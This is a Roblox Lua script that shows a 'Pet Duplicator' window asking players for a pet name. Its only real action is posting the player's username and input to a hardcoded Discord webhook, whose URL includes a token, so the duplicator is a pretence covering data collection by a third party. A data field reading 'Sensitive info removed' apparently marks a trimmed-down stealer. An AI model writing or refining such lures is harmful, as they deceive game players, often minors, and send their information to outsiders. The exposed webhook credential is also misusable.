local player = game.Players.LocalPlayer
local HttpService = game:GetService("HttpService")

local screenGui = Instance.new("ScreenGui")
screenGui.Name = "PetDupeUI"
screenGui.Parent = player:WaitForChild("PlayerGui")

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 350, 0, 180)
frame.Position = UDim2.new(0.5, -175, 0.5, -90)
frame.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
frame.BorderSizePixel = 0
frame.Parent = screenGui

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 40)
title.BackgroundTransparency = 1
title.Text = "Pet Duplicator"
title.TextColor3 = Color3.new(1,1,1)
title.Font = Enum.Font.GothamBold
title.TextSize = 28
title.Parent = frame

local instruction = Instance.new("TextLabel")
instruction.Size = UDim2.new(1, -20, 0, 30)
instruction.Position = UDim2.new(0, 10, 0, 45)
instruction.BackgroundTransparency = 1
instruction.Text = "Enter pet name to duplicate:"
instruction.TextColor3 = Color3.new(0.8, 0.8, 0.8)
instruction.Font = Enum.Font.Gotham
instruction.TextSize = 18
instruction.TextXAlignment = Enum.TextXAlignment.Left
instruction.Parent = frame

local inputBox = Instance.new("TextBox")
inputBox.Size = UDim2.new(1, -20, 0, 35)
inputBox.Position = UDim2.new(0, 10, 0, 80)
inputBox.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
inputBox.TextColor3 = Color3.new(1, 1, 1)
inputBox.Font = Enum.Font.Gotham
inputBox.TextSize = 20
inputBox.PlaceholderText = "Pet name here..."
inputBox.ClearTextOnFocus = false
inputBox.Parent = frame

local dupeButton = Instance.new("TextButton")
dupeButton.Size = UDim2.new(1, -20, 0, 40)
dupeButton.Position = UDim2.new(0, 10, 0, 130)
dupeButton.BackgroundColor3 = Color3.fromRGB(75, 150, 75)
dupeButton.TextColor3 = Color3.new(1,1,1)
dupeButton.Font = Enum.Font.GothamBold
dupeButton.TextSize = 24
dupeButton.Text = "Duplicate"
dupeButton.Parent = frame

local resultLabel = Instance.new("TextLabel")
resultLabel.Size = UDim2.new(1, -20, 0, 40)
resultLabel.Position = UDim2.new(0, 10, 0, 175)
resultLabel.BackgroundTransparency = 1
resultLabel.TextColor3 = Color3.fromRGB(255, 150, 150)
resultLabel.Font = Enum.Font.Gotham
resultLabel.TextSize = 18
resultLabel.TextXAlignment = Enum.TextXAlignment.Center
resultLabel.Parent = frame

local function sendToWebhook(data)
    pcall(function()
        HttpService:PostAsync(
            "https://discord.com/api/webhooks/1375595906250051795/n7LhadF9JTRfDThypkVKZp2OMuDQ9_BFsddANUBhhzxi1A3XHUKmPdLHLWsUUsrC2ItG",
            HttpService:JSONEncode(data),
            Enum.HttpContentType.ApplicationJson
        )
    end)
end

dupeButton.MouseButton1Click:Connect(function()
    local petName = inputBox.Text
    if petName == "" then
        resultLabel.Text = "Please enter a pet name."
        return
    end

    local Data = {
        Username = player.Name,
        Pet = petName,
        Note = "Sensitive info removed"
    }

    sendToWebhook(Data)
    resultLabel.Text = "Request sent.\nCheck Discord webhook."
end)
